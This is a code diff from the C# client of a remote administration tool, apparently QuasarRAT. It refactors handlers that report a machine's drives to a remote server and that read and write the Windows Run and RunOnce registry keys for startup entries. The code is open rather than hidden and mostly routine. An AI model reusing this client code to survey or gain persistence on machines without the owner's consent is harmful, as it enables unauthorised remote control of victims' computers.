@@ -5,10 +5,11 @@ using System.IO;
 using System.Linq;
 using System.Windows.Forms;
 using Microsoft.Win32;
-using xClient.Core.Information;
-using xClient.Core.RemoteShell;
 using xClient.Core.Extensions;
+using xClient.Core.Helper;
 using xClient.Core.Networking;
+using xClient.Core.Utilities;
+using xClient.Enums;
 
 namespace xClient.Core.Commands
 {
@@ -17,7 +18,28 @@ namespace xClient.Core.Commands
     {
         public static void HandleGetDrives(Packets.ServerPackets.GetDrives command, Client client)
         {
-            new Packets.ClientPackets.GetDrivesResponse(Environment.GetLogicalDrives()).Execute(client);
+            var drives = DriveInfo.GetDrives().Where(d => d.IsReady).ToArray();
+            if (drives.Length == 0) return;
+
+            string[] displayName = new string[drives.Length];
+            string[] rootDirectory = new string[drives.Length];
+            for (int i = 0; i < drives.Length; i++)
+            {
+                var volumeLabel = drives[i].VolumeLabel;
+                if (string.IsNullOrEmpty(volumeLabel))
+                {
+                    displayName[i] = string.Format("{0} [{1}, {2}]", drives[i].RootDirectory.FullName,
+                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                }
+                else
+                {
+                    displayName[i] = string.Format("{0} ({1}) [{2}, {3}]", drives[i].RootDirectory.FullName, volumeLabel,
+                        FormatHelper.DriveTypeName(drives[i].DriveType), drives[i].DriveFormat);
+                }
+                rootDirectory[i] = drives[i].RootDirectory.FullName;
+            }
+
+            new Packets.ClientPackets.GetDrivesResponse(displayName, rootDirectory).Execute(client);
         }
 
         public static void HandleDoShutdownAction(Packets.ServerPackets.DoShutdownAction command, Client client)
@@ -88,7 +110,7 @@ namespace xClient.Core.Commands
                         startupItems.AddRange(key.GetFormattedKeyValues().Select(formattedKeyValue => "3" + formattedKeyValue));
                     }
                 }
-                if (OSInfo.Bits == 64)
+                if (PlatformHelper.Architecture == 64)
                 {
                     using (var key = Registry.LocalMachine.OpenReadonlySubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
                     {
@@ -169,7 +191,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 4:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (var key = Registry.LocalMachine.OpenWritableSubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
@@ -182,7 +204,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 5:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (var key = Registry.LocalMachine.OpenWritableSubKeySafe("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
@@ -268,7 +290,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 4:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (
@@ -282,7 +304,7 @@ namespace xClient.Core.Commands
                         }
                         break;
                     case 5:
-                        if (OSInfo.Bits != 64)
+                        if (PlatformHelper.Architecture != 64)
                             throw new NotSupportedException("Only on 64-bit systems supported");
 
                         using (
